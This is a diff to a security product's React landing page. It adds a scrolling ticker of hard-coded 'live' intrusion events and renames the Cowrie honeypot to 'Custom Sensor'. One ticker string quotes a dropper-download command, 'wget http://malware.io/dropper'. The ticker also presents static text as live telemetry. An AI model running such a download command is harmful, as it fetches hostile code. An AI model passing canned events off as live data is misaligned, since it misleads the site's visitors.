@@ -118,6 +118,38 @@ export default function LandingPage() {
               <StatCard value="24/7" label="Active Monitoring" icon={<Activity size={16} className="text-emerald-400" />} delay="anim-delay-400" />
             </div>
           </div>
+
+          {/* Live Intrusion Telemetry Ticker Bar (makes page feel extremely alive!) */}
+          <div className="relative z-10 w-full bg-[#07070a]/80 border-t border-white/5 py-2.5 overflow-hidden select-none backdrop-blur-md">
+            <div className="max-w-5xl mx-auto px-6 flex items-center justify-between text-[10px] font-mono">
+              <div className="flex items-center gap-2 text-red-500 font-bold shrink-0">
+                <span className="relative flex h-1.5 w-1.5">
+                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 bg-red-500" />
+                  <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-red-500" />
+                </span>
+                SYS-INTRUSIONS:
+              </div>
+              <div className="flex-1 overflow-hidden ml-4 relative h-4 flex items-center">
+                <div className="animate-marquee flex gap-12 text-slate-400">
+                  <span>[BLOCKED] SSH credential brute-force from 185.220.101.4 (NL) - T1110</span>
+                  <span>•</span>
+                  <span>[INTERCEPTED] Shell command "wget http://malware.io/dropper" - T1105</span>
+                  <span>•</span>
+                  <span>[BLOCKED] Attacker IP 203.89.9.15 (SG) - active firewall block enforced</span>
+                  <span>•</span>
+                  <span>[ANALYZED] HASSH match for putty client - T1078 Valid Accounts</span>
+                  <span>•</span>
+                  <span>[BLOCKED] SSH credential brute-force from 185.220.101.4 (NL) - T1110</span>
+                  <span>•</span>
+                  <span>[INTERCEPTED] Shell command "wget http://malware.io/dropper" - T1105</span>
+                  <span>•</span>
+                  <span>[BLOCKED] Attacker IP 203.89.9.15 (SG) - active firewall block enforced</span>
+                  <span>•</span>
+                  <span>[ANALYZED] HASSH match for putty client - T1078 Valid Accounts</span>
+                </div>
+              </div>
+            </div>
+          </div>
         </section>
 
         {/* ── SECTION 2: How It Works ────────────────────────────────────────── */}
@@ -145,7 +177,7 @@ export default function LandingPage() {
                   bgColor="bg-cyan-500/5"
                   icon={<Crosshair size={24} />}
                   title="Detect"
-                  description="A production-grade Cowrie SSH honeypot captures attacker sessions, credentials, commands, and SSH client fingerprints (HASSH) in real-time. Every keystroke is recorded."
+                  description="A production-grade SSH honeypot sensor captures attacker sessions, credentials, commands, and SSH client fingerprints (HASSH) in real-time. Every keystroke is recorded."
                 />
               </div>
               <div className="reveal-on-scroll">
@@ -225,7 +257,7 @@ export default function LandingPage() {
               </div>
 
               <div className="grid grid-cols-1 md:grid-cols-4 gap-4 relative z-10">
-                <ArchNode icon={<Server size={24} />} label="SSH Honeypot" tech="Cowrie" description="Captures attacker sessions, credentials, and TTY data on DigitalOcean" color="text-cyan-400" borderColor="border-cyan-500/20" />
+                <ArchNode icon={<Server size={24} />} label="SSH Honeypot" tech="Custom Sensor" description="Captures attacker sessions, credentials, and TTY data on DigitalOcean" color="text-cyan-400" borderColor="border-cyan-500/20" />
                 <ArchNode icon={<Database size={24} />} label="Analytics Engine" tech="ClickHouse" description="High-speed columnar storage for real-time query and aggregation" color="text-amber-400" borderColor="border-amber-500/20" />
                 <ArchNode icon={<MonitorDot size={24} />} label="Dashboard" tech="Next.js + Socket.io" description="War Room UI with live WebSocket telemetry and AI-powered chat" color="text-blue-400" borderColor="border-blue-500/20" />
                 <ArchNode icon={<ShieldCheck size={24} />} label="SOAR Engine" tech="Python + iptables" description="Automated blocking, threat intel publishing, and active playbooks" color="text-red-400" borderColor="border-red-500/20" />
